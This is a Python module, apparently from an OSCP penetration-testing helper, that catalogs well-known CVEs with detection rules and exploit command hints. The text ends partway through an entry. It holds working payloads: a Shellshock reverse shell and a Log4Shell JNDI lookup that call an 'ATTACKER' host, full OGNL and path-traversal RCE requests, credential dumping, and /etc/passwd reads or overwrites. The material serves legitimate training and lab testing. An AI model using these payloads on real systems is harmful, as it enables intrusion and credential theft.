"""
core/cve_database.py — OSCP-relevant CVE knowledge base.

Structured catalog of CVEs commonly encountered on OSCP exam & labs (PG, HTB
retired easy/medium). Each entry is a dict with a stable field shape so the
engine, session attack-path builder, and recommender can consume it uniformly.

Field schema per entry:
    id              str     — "CVE-YYYY-NNNNN"
    name            str     — short popular name (e.g. "EternalBlue")
    affected        str     — human-readable software + version range
    severity        str     — "CRITICAL" | "HIGH" | "MEDIUM"
    detection       dict    — heuristics to match the CVE:
        port            int | list[int] | None   — listening port(s); None for
                                                   local-privesc or context-only
        nmap_script     str | None   — NSE script whose output signals this CVE
        version_regex   str | None   — regex to match against banner/version
        service_keyword str | None   — lowercase substring of service name
    manual_exploit  list[str] — OSCP-safe command hints (placeholders:
                                {ip}, {port}, {domain}, {user}, {pass})
                                MSF modules prefixed with [MSF-RESTRICTED]
    searchsploit_id str | None — EDB-ID for `searchsploit -m` (None when no
                                 single canonical EDB PoC exists)
    msf_module      str | None — MSF path (consumer decides whether to surface
                                 given OSCP 1-machine Metasploit rule)
    oscp_note       str     — one-line relevance blurb
    references      list[str] — URLs to advisories / PoCs

Public helpers:
    match_by_port(port)                           -> list[entry]   (pre-sorted by severity)
    match_by_version(service, version)            -> list[entry]
    match_by_nmap_script(script_name, output)     -> list[entry]
    format_cve_for_attack_path(cve, ip, port)     -> (title, body, refs_line)

Design notes:
    * Port→CVE index is built once at import time and stored pre-sorted by
      severity — consumers can truncate without losing criticals.
    * Local-privesc CVEs (DirtyCow, PwnKit, ...) have port=None and are
      intentionally absent from _CVE_BY_PORT; they need post-foothold context.
    * `match_by_nmap_script` is gated on VULNERABLE/CVE tokens in NSE output to
      avoid false positives from mere script execution.
    * Version regexes are CONSERVATIVE — prefer false negatives over false
      positives. Add narrow ranges; tighten later.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple


# --------------------------------------------------------------------------- #
# CVE entries                                                                 #
# --------------------------------------------------------------------------- #

CVE_DATABASE: List[Dict[str, Any]] = [

    # ------------------------------------------------------------------ #
    # Windows / Active Directory (9)                                     #
    # ------------------------------------------------------------------ #
    {
        "id": "CVE-2017-0144",
        "name": "EternalBlue (MS17-010)",
        "affected": "Windows SMBv1 — Win7/2008R2/Win8.1/2012R2 (unpatched)",
        "severity": "CRITICAL",
        "detection": {
            "port": 445,
            "nmap_script": "smb-vuln-ms17-010",
            "version_regex": None,
            "service_keyword": "microsoft-ds",
        },
        "manual_exploit": [
            "nmap -p445 --script smb-vuln-ms17-010 {ip}",
            "# Standalone PoC (no MSF):",
            "searchsploit -m 42315",
            "python3 42315.py {ip}",
            "# AutoBlue alternative: https://github.com/3ndG4me/AutoBlue-MS17-010",
            "[MSF-RESTRICTED] use exploit/windows/smb/ms17_010_eternalblue",
        ],
        "searchsploit_id": "42315",
        "msf_module": "exploit/windows/smb/ms17_010_eternalblue",
        "oscp_note": "Classic OSCP lab staple. Prefer standalone PoC — MSF limited to 1 machine.",
        "references": [
            "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010",
            "https://www.exploit-db.com/exploits/42315",
        ],
    },
    {
        "id": "CVE-2008-4250",
        "name": "MS08-067 NetAPI",
        "affected": "Windows 2000 / XP / 2003 (Server service)",
        "severity": "CRITICAL",
        "detection": {
            "port": 445,
            "nmap_script": "smb-vuln-ms08-067",
            "version_regex": None,
            "service_keyword": "microsoft-ds",
        },
        "manual_exploit": [
            "nmap -p445 --script smb-vuln-ms08-067 {ip}",
            "searchsploit -m 40279",
            "# Python3 port: git clone https://github.com/Thelastvvv/ms08-067 && python3 ms08-067/exploit.py {ip}",
            "[MSF-RESTRICTED] use exploit/windows/smb/ms08_067_netapi",
        ],
        "searchsploit_id": "40279",
        "msf_module": "exploit/windows/smb/ms08_067_netapi",
        "oscp_note": "Legacy Windows RCE — shows up on older lab boxes.",
        "references": [
            "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067",
            "https://www.exploit-db.com/exploits/40279",
        ],
    },
    {
        "id": "CVE-2020-1472",
        "name": "Zerologon",
        "affected": "Windows DC Netlogon (pre Aug-2020 patch)",
        "severity": "CRITICAL",
        "detection": {
            "port": [135, 445],
            "nmap_script": "smb2-security-mode",
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Detect:",
            "git clone https://github.com/SecuraBV/CVE-2020-1472 && python3 CVE-2020-1472/zerologon_tester.py DC01 {ip}",
            "# Exploit (sets DC$ password to empty, then dump):",
            "python3 set_empty_pw.py DC01 {ip}",
            "impacket-secretsdump -just-dc -no-pass DOMAIN/DC01\\$@{ip}",
            "# Restore afterwards — failing to restore breaks AD replication.",
        ],
        "searchsploit_id": None,
        "msf_module": "auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
        "oscp_note": "AD instant-win when present. REMEMBER to restore DC$ hash post-exploit.",
        "references": [
            "https://www.secura.com/blog/zero-logon",
            "https://github.com/SecuraBV/CVE-2020-1472",
        ],
    },
    {
        "id": "CVE-2020-0796",
        "name": "SMBGhost",
        "affected": "Windows 10 1903/1909 SMBv3 compression",
        "severity": "CRITICAL",
        "detection": {
            "port": 445,
            "nmap_script": "smb-protocols",
            "version_regex": None,
            "service_keyword": "microsoft-ds",
        },
        "manual_exploit": [
            "nmap -p445 --script smb-protocols {ip}  # check SMB 3.1.1",
            "searchsploit -m 48537",
            "# LPE PoC: https://github.com/danigargu/CVE-2020-0796",
        ],
        "searchsploit_id": "48537",
        "msf_module": "exploit/windows/smb/cve_2020_0796_smbghost",
        "oscp_note": "Usable as LPE on vulnerable Win10 build; remote RCE PoCs are unstable.",
        "references": [
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796",
            "https://www.exploit-db.com/exploits/48537",
        ],
    },
    {
        "id": "CVE-2021-34527",
        "name": "PrintNightmare",
        "affected": "Windows Print Spooler (all SKUs incl. DCs)",
        "severity": "CRITICAL",
        "detection": {
            "port": [135, 445],
            "nmap_script": "rpc-grind",
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Check if Spooler service is running:",
            "rpcdump.py @{ip} | grep -i spool",
            "# Exploit chain (cube0x0 PoC):",
            "git clone https://github.com/cube0x0/CVE-2021-1675",
            "python3 CVE-2021-1675.py DOMAIN/{user}:{pass}@{ip} '\\\\attacker\\smb\\addUser.dll'",
            # TODO: verify — EDB-ID 50170 corresponds to CVE-2021-1675 (precursor), not CVE-2021-34527.
            # The chain uses cube0x0's GitHub PoC primarily.
        ],
        "searchsploit_id": None,
        "msf_module": "exploit/windows/dcerpc/cve_2021_1675_printnightmare",
        "oscp_note": "RCE as SYSTEM against DCs when Spooler is enabled. Chains with CVE-2021-1675.",
        "references": [
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527",
            "https://github.com/cube0x0/CVE-2021-1675",
        ],
    },
    {
        "id": "CVE-2019-0708",
        "name": "BlueKeep",
        "affected": "Windows XP / 2003 / 7 / 2008R2 RDP",
        "severity": "CRITICAL",
        "detection": {
            "port": 3389,
            "nmap_script": "rdp-vuln-ms12-020",
            "version_regex": None,
            "service_keyword": "ms-wbt-server",
        },
        "manual_exploit": [
            "nmap -p3389 --script rdp-vuln-ms12-020 {ip}",
            "searchsploit -m 49090",
            "# Kernel exploit — very crashy. Test on snapshot first.",
        ],
        "searchsploit_id": "49090",  # TODO: verify EDB-ID
        "msf_module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "oscp_note": "High BSOD risk; prefer just as evidence unless shell is critical.",
        "references": [
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708",
            "https://www.exploit-db.com/exploits/49090",
        ],
    },
    {
        "id": "CVE-2022-26923",
        "name": "Certifried (AD CS)",
        "affected": "Windows AD CS — machine-account certificate abuse",
        "severity": "CRITICAL",
        "detection": {
            "port": [389, 636, 3268, 3269],
            "nmap_script": None,
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Enumerate AD CS templates:",
            "certipy find -u {user}@{domain} -p '{pass}' -dc-ip {ip}",
            "# Request cert as DC:",
            "certipy req -u {user}@{domain} -p '{pass}' -ca <CA> -template Machine -upn 'administrator@{domain}'",
            "certipy auth -pfx administrator.pfx -dc-ip {ip}",
        ],
        "searchsploit_id": None,
        "msf_module": None,
        "oscp_note": "Privilege escalation to DA when AD CS is present.",
        "references": [
            "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923",
            "https://github.com/ly4k/Certipy",
        ],
    },
    {
        "id": "CVE-2021-42278",
        "name": "noPac (sAMAccountName spoofing)",
        "affected": "Windows AD DCs (pre Nov-2021 patch)",
        "severity": "CRITICAL",
        "detection": {
            "port": [88, 389, 445],
            "nmap_script": None,
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Chain with CVE-2021-42287:",
            "git clone https://github.com/ly4k/Pachine",
            "python3 pachine.py -domain {domain} -username {user} -password '{pass}' -dc-ip {ip}",
            "# Or noPac.py:",
            "python3 noPac.py {domain}/{user}:'{pass}' -dc-ip {ip} --impersonate administrator -use-ldap -shell",
        ],
        "searchsploit_id": "51212",  # TODO: verify EDB-ID
        "msf_module": None,
        "oscp_note": "Any domain user → DA. Chains with CVE-2021-42287.",
        "references": [
            "https://www.secureworks.com/research/sam-name-impersonation",
            "https://github.com/ly4k/Pachine",
        ],
    },
    {
        "id": "CVE-2021-42287",
        "name": "noPac (KDC bamboozling)",
        "affected": "Windows AD KDC (pre Nov-2021 patch)",
        "severity": "CRITICAL",
        "detection": {
            "port": [88, 389, 445],
            "nmap_script": None,
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Chain with CVE-2021-42278 via noPac.py:",
            "python3 noPac.py {domain}/{user}:'{pass}' -dc-ip {ip} --impersonate administrator -use-ldap -dump",
        ],
        "searchsploit_id": "51212",  # TODO: verify EDB-ID
        "msf_module": None,
        "oscp_note": "Pair with CVE-2021-42278 — same exploit chain reports both.",
        "references": [
            "https://www.secureworks.com/research/sam-name-impersonation",
        ],
    },

    # ------------------------------------------------------------------ #
    # Linux privilege escalation (7)                                     #
    # ------------------------------------------------------------------ #
    {
        "id": "CVE-2014-6271",
        "name": "Shellshock",
        "affected": "GNU Bash <= 4.3 (CGI, DHCP, OpenSSH ForceCommand)",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080],
            "nmap_script": "http-shellshock",
            "version_regex": r"bash\s+[0-3]\.",
            "service_keyword": "http",
        },
        "manual_exploit": [
            "nmap -p80,443 --script http-shellshock --script-args 'uri=/cgi-bin/status' {ip}",
            "# Manual probe:",
            "curl -A '() { :; }; /bin/bash -c \"id\"' http://{ip}/cgi-bin/test.cgi",
            "# Reverse shell via CGI:",
            "curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' http://{ip}/cgi-bin/test.cgi",
            "searchsploit -m 34900",
        ],
        "searchsploit_id": "34900",
        "msf_module": None,
        "oscp_note": "Hit /cgi-bin/* first. Any CGI script that invokes bash is vulnerable.",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
            "https://www.exploit-db.com/exploits/34900",
        ],
    },
    {
        "id": "CVE-2016-5195",
        "name": "DirtyCow",
        "affected": "Linux kernel < 4.8.3 (COW race)",
        "severity": "HIGH",
        "detection": {
            "port": None,
            "nmap_script": None,
            "version_regex": r"Linux\s+.*2\.6\.|Linux\s+.*3\.|Linux\s+.*4\.[0-7]\b",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Post-foothold LPE — compile on target if possible:",
            "searchsploit -m 40839",
            "gcc -pthread dirty.c -o dirty -lcrypt",
            "./dirty my-new-password  # rewrites /etc/passwd",
        ],
        "searchsploit_id": "40839",
        "msf_module": None,
        "oscp_note": "LPE on older Linux kernels. Backup /etc/passwd before exploiting.",
        "references": [
            "https://dirtycow.ninja/",
            "https://www.exploit-db.com/exploits/40839",
        ],
    },
    {
        "id": "CVE-2021-4034",
        "name": "PwnKit (polkit pkexec)",
        "affected": "polkit pkexec < 0.120 (Linux)",
        "severity": "HIGH",
        "detection": {
            "port": None,
            "nmap_script": None,
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Post-foothold LPE — works on almost every default Linux pre-2022:",
            "which pkexec && pkexec --version  # sanity check",
            "searchsploit -m 50689",
            "# Or one-shot C PoC: https://github.com/berdav/CVE-2021-4034",
        ],
        "searchsploit_id": "50689",
        "msf_module": None,
        "oscp_note": "Most reliable Linux LPE of the decade — try it before any other LPE.",
        "references": [
            "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt",
            "https://www.exploit-db.com/exploits/50689",
        ],
    },
    {
        "id": "CVE-2021-3156",
        "name": "Baron Samedit (sudo)",
        "affected": "sudo 1.8.2 – 1.9.5p1",
        "severity": "HIGH",
        "detection": {
            "port": None,
            "nmap_script": None,
            "version_regex": r"sudo\s+1\.(8\.[2-9]|8\.[12][0-9]|9\.[0-5])",
            "service_keyword": None,
        },
        "manual_exploit": [
            "sudo --version",
            "searchsploit -m 49521",
            "# Blasty PoC: https://github.com/blasty/CVE-2021-3156",
        ],
        "searchsploit_id": "49521",  # TODO: verify EDB-ID
        "msf_module": None,
        "oscp_note": "LPE via sudo heap overflow. Check sudo --version first.",
        "references": [
            "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt",
            "https://www.exploit-db.com/exploits/49521",
        ],
    },
    {
        "id": "CVE-2017-7494",
        "name": "SambaCry",
        "affected": "Samba 3.5.0 – 4.6.3 (writable share)",
        "severity": "CRITICAL",
        "detection": {
            "port": 445,
            "nmap_script": "smb-vuln-cve-2017-7494",
            "version_regex": r"Samba\s+(3\.[5-9]|3\.1\d|4\.[0-5]|4\.6\.[0-3])",
            "service_keyword": "samba",
        },
        "manual_exploit": [
            "nmap -p445 --script smb-vuln-cve-2017-7494 {ip}",
            "smbmap -H {ip}  # find writable share",
            "searchsploit -m 42060",
            "# Needs writable share + guess of full path. Anonymous-writable → trivial RCE.",
        ],
        "searchsploit_id": "42060",
        "msf_module": "exploit/linux/samba/is_known_pipename",
        "oscp_note": "Requires writable SMB share — confirm with smbmap first.",
        "references": [
            "https://www.samba.org/samba/history/security.html",
            "https://www.exploit-db.com/exploits/42060",
        ],
    },
    {
        "id": "CVE-2022-0847",
        "name": "DirtyPipe",
        "affected": "Linux kernel 5.8 – 5.16.11 / 5.15.25 / 5.10.102",
        "severity": "HIGH",
        "detection": {
            "port": None,
            "nmap_script": None,
            "version_regex": r"Linux\s+.*5\.(8|9|1[0-6])\b",
            "service_keyword": None,
        },
        "manual_exploit": [
            "uname -r  # confirm kernel range",
            "searchsploit -m 50808",
            "# Overwrite SUID root binary (/usr/bin/su) temporarily to pop root.",
        ],
        "searchsploit_id": "50808",
        "msf_module": None,
        "oscp_note": "Reliable LPE on 5.8–5.16 kernels. Pipe splice-based, very stable.",
        "references": [
            "https://dirtypipe.cm4all.com/",
            "https://www.exploit-db.com/exploits/50808",
        ],
    },
    {
        "id": "CVE-2023-32233",
        "name": "Netfilter nf_tables UAF",
        "affected": "Linux kernel 3.13 – 6.3.1",
        "severity": "HIGH",
        "detection": {
            "port": None,
            "nmap_script": None,
            "version_regex": None,
            "service_keyword": None,
        },
        "manual_exploit": [
            "uname -r",
            "# PoC requires CAP_NET_ADMIN in user ns — check:",
            "cat /proc/sys/kernel/unprivileged_userns_clone",
            "# https://github.com/Liuk3r/CVE-2023-32233",
        ],
        "searchsploit_id": None,
        "msf_module": None,
        "oscp_note": "Out-of-scope for most OSCP labs; keep for reference on modern targets.",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-32233",
        ],
    },

    # ------------------------------------------------------------------ #
    # Web applications (10)                                              #
    # ------------------------------------------------------------------ #
    {
        "id": "CVE-2021-44228",
        "name": "Log4Shell",
        "affected": "Apache log4j2 2.0 – 2.14.1",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443, 8000, 9000],
            "nmap_script": "http-vuln-cve2021-44228",
            "version_regex": r"log4j(?:-core)?-2\.(?:[0-9]|1[0-4])\b",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Spin LDAP ref server (JNDI-Exploit-Kit):",
            "git clone https://github.com/pimps/JNDI-Exploit-Kit",
            "# Trigger — try common sinks (User-Agent, X-Forwarded-For, body params):",
            "curl -H 'User-Agent: ${jndi:ldap://ATTACKER:1389/Exploit}' http://{ip}:{port}/",
            "nuclei -u http://{ip}:{port} -tags log4j",
        ],
        "searchsploit_id": None,
        "msf_module": "exploit/multi/http/log4shell_header_injection",
        "oscp_note": "Spray JNDI payloads across User-Agent, Referer, body params — sinks vary.",
        "references": [
            "https://logging.apache.org/log4j/2.x/security.html",
            "https://github.com/pimps/JNDI-Exploit-Kit",
        ],
    },
    {
        "id": "CVE-2021-41773",
        "name": "Apache path traversal 2.4.49",
        "affected": "Apache httpd 2.4.49",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443],
            "nmap_script": "http-vuln-cve2021-41773",
            "version_regex": r"Apache/2\.4\.49\b",
            "service_keyword": "apache",
        },
        "manual_exploit": [
            "curl -s --path-as-is 'http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'",
            "# mod_cgi enabled → RCE:",
            "curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' 'http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/bin/sh'",
            "searchsploit -m 50383",
        ],
        "searchsploit_id": "50383",
        "msf_module": "exploit/multi/http/apache_normalize_path_rce",
        "oscp_note": "Path traversal → LFI; if mod_cgi/mod_cgid enabled → RCE.",
        "references": [
            "https://httpd.apache.org/security/vulnerabilities_24.html",
            "https://www.exploit-db.com/exploits/50383",
        ],
    },
    {
        "id": "CVE-2021-42013",
        "name": "Apache path traversal 2.4.50",
        "affected": "Apache httpd 2.4.49–2.4.50 (incomplete 41773 fix)",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443],
            "nmap_script": "http-vuln-cve2021-41773",
            "version_regex": r"Apache/2\.4\.50\b",
            "service_keyword": "apache",
        },
        "manual_exploit": [
            "curl -s --path-as-is 'http://{ip}:{port}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
            "searchsploit -m 50406",
        ],
        "searchsploit_id": "50406",
        "msf_module": "exploit/multi/http/apache_normalize_path_rce",
        "oscp_note": "Double-encoded variant of 41773 — try after 41773 payload is patched.",
        "references": [
            "https://httpd.apache.org/security/vulnerabilities_24.html",
            "https://www.exploit-db.com/exploits/50406",
        ],
    },
    {
        "id": "CVE-2017-5638",
        "name": "Struts2 S2-045",
        "affected": "Apache Struts2 2.3.x – 2.5.10 (Content-Type OGNL)",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443],
            "nmap_script": "http-vuln-cve2017-5638",
            "version_regex": r"Struts\s*2\.(3|5\.[0-9]\b|5\.10\b)",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Content-Type OGNL injection:",
            "curl -i -H \"Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" http://{ip}:{port}/struts2-showcase/",
            "searchsploit -m 41570",
        ],
        "searchsploit_id": "41570",
        "msf_module": "exploit/multi/http/struts2_content_type_ognl",
        "oscp_note": "Classic PG box (e.g. Kevin). File-upload endpoints are typical sinks.",
        "references": [
            "https://cwiki.apache.org/confluence/display/WW/S2-045",
            "https://www.exploit-db.com/exploits/41570",
        ],
    },
    {
        "id": "CVE-2020-17530",
        "name": "Struts2 S2-061 (forced OGNL)",
        "affected": "Apache Struts2 2.0.0 – 2.5.25",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443],
            "nmap_script": None,
            "version_regex": r"Struts\s*2\.(0|1|2|3|4|5\.[0-9]\b|5\.1[0-9]\b|5\.2[0-5]\b)",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# OGNL evaluation forced via tag attributes:",
            "curl \"http://{ip}:{port}/?id=%25%7B(%23context%3D%23attr%5B'struts.valueStack'%5D).(%23context.setMemberAccess(%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)).(%23rt%3D%40java.lang.Runtime%40getRuntime()).(%23rt.exec('id'))%7D\"",
            "# Or use KLKN/CVE-2020-17530 PoC repo.",
        ],
        "searchsploit_id": None,
        "msf_module": "exploit/multi/http/struts2_namespace_ognl",
        "oscp_note": "Double-evaluated OGNL — check S2-061 advisory for affected tags.",
        "references": [
            "https://cwiki.apache.org/confluence/display/WW/S2-061",
        ],
    },
    {
        "id": "CVE-2022-22965",
        "name": "Spring4Shell",
        "affected": "Spring Framework < 5.2.20 / 5.3.18 on JDK 9+",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 443, 8080, 8443, 8000, 9000],
            "nmap_script": None,
            "version_regex": r"Spring\s*(Framework|MVC)?\s*5\.[0-3]",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Tomcat log poisoning via class.module.classLoader — trigger JSP webshell:",
            "searchsploit -m 50868",
            "# PoC: https://github.com/craig/SpringCore0day",
            "# Needs DataBinder binding + JDK >= 9 + WAR deployment.",
        ],
        "searchsploit_id": "50868",  # TODO: verify EDB-ID
        "msf_module": "exploit/multi/http/spring_framework_rce_spring4shell",
        "oscp_note": "Multiple preconditions — confirm JDK >= 9 and WAR-packaged Tomcat.",
        "references": [
            "https://tanzu.vmware.com/security/cve-2022-22965",
        ],
    },
    {
        "id": "CVE-2022-26134",
        "name": "Confluence OGNL injection",
        "affected": "Atlassian Confluence Server/DC pre-2022-06 patch",
        "severity": "CRITICAL",
        "detection": {
            "port": [8090, 8091, 80, 443, 8080],
            "nmap_script": None,
            "version_regex": r"Confluence\s+(?:6\.|7\.(?:[0-9]|1[0-7]|18\.0))",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# URI OGNL injection — unauth RCE:",
            "curl -s 'http://{ip}:{port}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Out%22%2C%23a%29%29%7D/'",
            "searchsploit -m 50990",
        ],
        "searchsploit_id": "50990",  # TODO: verify EDB-ID
        "msf_module": "exploit/multi/http/atlassian_confluence_namespace_ognl_injection",
        "oscp_note": "Exam-relevant if Confluence appears. Check X-Cmd-Out response header.",
        "references": [
            "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html",
        ],
    },
    {
        "id": "CVE-2014-0160",
        "name": "Heartbleed",
        "affected": "OpenSSL 1.0.1 – 1.0.1f",
        "severity": "HIGH",
        "detection": {
            "port": [443, 8443, 993, 995, 465],
            "nmap_script": "ssl-heartbleed",
            "version_regex": r"OpenSSL\s+1\.0\.1[a-f]?\b",
            "service_keyword": None,
        },
        "manual_exploit": [
            "nmap -p443,8443 --script ssl-heartbleed {ip}",
            "searchsploit -m 32764",
            "# Memory leak — grep for session cookies, credentials in dumps.",
        ],
        "searchsploit_id": "32764",
        "msf_module": "auxiliary/scanner/ssl/openssl_heartbleed",
        "oscp_note": "Memory disclosure, not RCE — dump repeatedly and grep for cookies/creds.",
        "references": [
            "https://heartbleed.com/",
            "https://www.exploit-db.com/exploits/32764",
        ],
    },
    {
        "id": "CVE-2020-14882",
        "name": "WebLogic console RCE",
        "affected": "Oracle WebLogic 10.3.6 / 12.1.3 / 12.2.1.3/4 / 14.1.1",
        "severity": "CRITICAL",
        "detection": {
            "port": [7001, 7002, 80, 443, 8888],
            "nmap_script": None,
            "version_regex": r"WebLogic\s+(10\.3|12\.[12]|14\.1)",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Auth bypass to admin console:",
            "curl -v 'http://{ip}:7001/console/css/%252e%252e%252fconsole.portal'",
            "# Chain with CVE-2020-14883 for RCE via HandleFactory:",
            "searchsploit -m 48971",
        ],
        "searchsploit_id": "48971",  # TODO: verify EDB-ID
        "msf_module": "exploit/multi/http/weblogic_deserialize_marshalledobject",
        "oscp_note": "Very noisy on reports — chain 14882 auth bypass with 14883 for RCE.",
        "references": [
            "https://www.oracle.com/security-alerts/cpuoct2020.html",
            "https://www.exploit-db.com/exploits/48971",
        ],
    },
    {
        "id": "CVE-2023-46604",
        "name": "ActiveMQ OpenWire RCE",
        "affected": "Apache ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3",
        "severity": "CRITICAL",
        "detection": {
            "port": [61616, 5672, 8161],
            "nmap_script": None,
            "version_regex": r"ActiveMQ\s+5\.(?:1[0-7]|18\.[0-2])",
            "service_keyword": "activemq",
        },
        "manual_exploit": [
            "# Serialized Spring config triggers ProcessBuilder:",
            "git clone https://github.com/X1r0z/ActiveMQ-RCE",
            "go run main.go -i {ip} -p {port} -u http://ATTACKER/poc.xml",
            "searchsploit -m 51830",
        ],
        "searchsploit_id": "51830",  # TODO: verify EDB-ID
        "msf_module": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604",
        "oscp_note": "Default port 61616 — unauth RCE via malicious Spring XML.",
        "references": [
            "https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt",
        ],
    },

    # ------------------------------------------------------------------ #
    # Classic / misc services (10)                                       #
    # ------------------------------------------------------------------ #
    {
        "id": "CVE-2014-6287",
        "name": "HFS Rejetto RCE",
        "affected": "Rejetto HFS 2.3x (HttpFileServer)",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 8080, 8081, 8000],
            "nmap_script": None,
            "version_regex": r"HttpFileServer\s+2\.3|Rejetto\s+HFS",
            "service_keyword": "httpfileserver",
        },
        "manual_exploit": [
            "# Macro injection via search param:",
            "curl \"http://{ip}:{port}/?search=%00{.exec|cmd.exe /c ping ATTACKER.}\"",
            "# If %00 stripped by curl, use PoC script directly:",
            "searchsploit -m 39161 && python2 39161.py {ip} {port}",
        ],
        "searchsploit_id": "39161",
        "msf_module": "exploit/windows/http/rejetto_hfs_exec",
        "oscp_note": "HTB Optimum style box. Windows target — expect cmd.exe payloads.",
        "references": [
            "https://www.exploit-db.com/exploits/39161",
        ],
    },
    {
        "id": "CVE-2018-18778",
        "name": "Icecast traversal",
        "affected": "Icecast 2.4.0 – 2.4.3 URL handler",
        "severity": "MEDIUM",
        "detection": {
            "port": [8000, 8080],
            "nmap_script": None,
            "version_regex": r"Icecast\s+2\.4\.[0-3]\b",
            "service_keyword": "icecast",
        },
        "manual_exploit": [
            "curl --path-as-is http://{ip}:{port}/admin/../../../../etc/passwd",
        ],
        "searchsploit_id": None,
        "msf_module": None,
        "oscp_note": "File-read only; combine with creds disclosure for wider impact.",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2018-18778",
        ],
    },
    {
        "id": "CVE-2019-16278",
        "name": "Nostromo nhttpd RCE",
        "affected": "nostromo / nhttpd 1.9.6",
        "severity": "CRITICAL",
        "detection": {
            "port": [80, 8080],
            "nmap_script": None,
            "version_regex": r"nostromo\s+1\.9\.6|nhttpd\s+1\.9\.6",
            "service_keyword": "nostromo",
        },
        "manual_exploit": [
            "curl --path-as-is -d 'echo; id' 'http://{ip}:{port}/.%0d./.%0d./.%0d./.%0d./bin/sh'",
            "searchsploit -m 47837",
        ],
        "searchsploit_id": "47837",
        "msf_module": "exploit/multi/http/nostromo_code_exec",
        "oscp_note": "HTB Traverxec. Path-traversal → /bin/sh over HTTP POST body.",
        "references": [
            "https://www.exploit-db.com/exploits/47837",
        ],
    },
    {
        "id": "CVE-2015-3306",
        "name": "ProFTPD mod_copy RCE",
        "affected": "ProFTPD 1.3.5 (mod_copy enabled)",
        "severity": "CRITICAL",
        "detection": {
            "port": 21,
            "nmap_script": "ftp-proftpd-backdoor",
            "version_regex": r"ProFTPD\s+1\.3\.5[a]?\b",
            "service_keyword": "proftpd",
        },
        "manual_exploit": [
            "# SITE CPFR/CPTO with mod_copy → write webshell:",
            "nc {ip} 21",
            "site cpfr /etc/passwd",
            "site cpto /var/www/html/shell.php",
            "searchsploit -m 36742",
        ],
        "searchsploit_id": "36742",
        "msf_module": "exploit/unix/ftp/proftpd_modcopy_exec",
        "oscp_note": "Need a writable web-server DocumentRoot for RCE. LFI-only otherwise.",
        "references": [
            "https://www.exploit-db.com/exploits/36742",
        ],
    },
    {
        "id": "CVE-2011-2523",
        "name": "vsftpd 2.3.4 backdoor",
        "affected": "vsftpd 2.3.4 (exact)",
        "severity": "CRITICAL",
        "detection": {
            "port": 21,
            "nmap_script": "ftp-vsftpd-backdoor",
            "version_regex": r"vsftpd\s*2\.3\.4\b",
            "service_keyword": "vsftpd",
        },
        "manual_exploit": [
            "# Login with user ending in :) triggers backdoor on port 6200:",
            "nc {ip} 21",
            "USER evil:)",
